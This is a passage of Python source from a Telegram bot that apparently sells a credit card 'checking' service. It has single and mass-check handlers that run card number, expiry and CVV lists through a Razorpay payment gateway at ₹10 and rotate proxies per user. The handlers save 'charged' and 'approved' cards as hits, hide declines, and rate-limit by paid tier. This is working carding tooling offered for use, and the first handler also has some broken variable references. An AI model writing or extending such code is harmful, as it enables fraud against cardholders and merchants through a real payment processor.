    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    razorpay_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text("🔄 Checking ...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                if proxy_list:
                    proxy_index = random.randint(0, len(proxy_list) - 1)
                    proxy_str = proxy_list[proxy_index]
        
        result = await check_card_razorpay_gate2(card, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        ui, status_category = format_razorpay_gate2_response(result, card, bin_info)
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        if status_category in ["charged", "approved"]:
            await save_hit_to_file(
                card=card, gateway="Razorpay Gate2",
                response=result.get("message", "Approved"),
                price="₹10",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            if status_category == "charged":
                user_data = user_manager.get_user(user_id)
                await send_hit_notification(
                    context=context, gateway="Razorpay", card=card,
                    response=result.get("message", "Charged"),
                    price="₹10",
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        add_user_credits(user_id, 1)
    finally:
        razorpay_active_tasks.pop(user_id, None)


# ============ RAZORPAY GATE2 MASS CHECK ============
@check_gateway("razorpay_gate2")
async def razorpay_gate2_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Razorpay gate2"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [RAZORPAY GATE2 MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    # Get user's working proxies
    user_proxies = []
    if user_manager.can_use_proxy(u_id):
        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
        else:
            print(f"⚠️ No working proxies found, using direct connection")
    
    stats = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    proxy_index = 0
    
    try:
        razorpay_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        CONCURRENCY = {
            "free": 2,
            "premium": 5,
            "ultimate": 5,
            "admin": 5,
        }.get(tier, 2)
        
        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
        
        if progress_msg is None:
            progress_text = (
                f"<b>Gateway</b> ➛ Razorpay (₹10)\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        
        async def update_progress(current: int):
            if current > 0 and current < total and current % 10 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            progress_text = (
                f"<b>Gateway</b> ➛ Razorpay (₹10)\n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    print(f"⚠️ Progress update error: {e}")
        
        async def process_single_card(card: str, idx: int):
            nonlocal processed_count, proxy_index
            
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            async with semaphore:
                await speed_controller.wait_if_needed()
                start = time.time()
                
                # Get proxy for this card (rotate through user's proxies)
                proxy_str = None
                if user_proxies:
                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
                    proxy_index += 1
                
                result = await check_card_razorpay_gate2(card, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                bin_info = await get_bin_info(card)
                
                response_msg = result.get("message", "")
                status_category = result.get("status_category", "unknown")
                
                async with stats_lock:
                    processed_count += 1
                    
                    if status_category == "charged":
                        stats["charged"] += 1
                        stats["approved"] += 1
                        print(f"🔥 [CHARGED] {card[:20]}...")
                    elif status_category == "approved":
                        stats["approved"] += 1
                        print(f"✅ [APPROVED] {card[:20]}...")
                    elif status_category == "declined":
                        stats["declined"] += 1
                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
                    else:
                        stats["errors"] += 1
                        print(f"⚠️ [ERROR] {card[:20]}...")
                    
                    if processed_count % 10 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
                if status_category in ["charged", "approved"]:
                    ui, _ = format_razorpay_gate2_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT] {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    await save_hit_to_file(
                        card=card, gateway="Razorpay Gate2",
                        response=response_msg,
                        price="₹10",
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                    
                    if status_category == "charged":
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context, gateway="Razorpay", card=card,
                            response=response_msg,
                            price="₹10",
                            user=user_data, bin_info=bin_info, status_category="charged"
                        )
                        user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in razorpay_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    stats["errors"] += 1
        
        if u_id in razorpay_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Razorpay Mass Check Complete</b>\n\n"
                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
                f"📝 <b>Total</b> ➛ {total}\n"
                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Razorpay gate2 mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        razorpay_active_tasks.pop(u_id, None)
        print(f"🏁 [Razorpay Gate2 Mass] Session ended for user {u_id}")


async def mass_check_razorpay_gate2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Razorpay gate2 - /mrp <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    # Check if user already has an active session
    if user_id in razorpay_active_tasks:
        await message.reply_text(
            "⚠️ You already have an active Razorpay session.\n"
            "Please wait for it to finish or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Razorpay gateway not available for {tier.upper()} tier.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
            f"Use /rp for single checks.\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            # Delete command message
            try:
                await message.delete()
            except:
                pass
            
            await razorpay_gate2_mass_check_logic(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    # Handle direct text input
    if not context.args:
        await message.reply_text(
            "📦 <b>Razorpay Gate2 Mass Check</b>\n\n"
            "Usage: <code>/mrp &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mrp\n\n"
            "Example: <code>/mrp 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: ₹10\n"
            "📍 Gateway: Razorpay (Direct Integration)\n"
            "✅ Only charged/approved cards will be shown\n"
            "❌ Declined cards are hidden from chat",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"USE /buy TO UPGRADE")
    
    # Check credits for mass check (1 credit per card for free users)
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Delete command message
    try:
        await message.delete()
    except:
        pass
    
    await razorpay_gate2_mass_check_logic(update, context, cards, None)
    
    
    
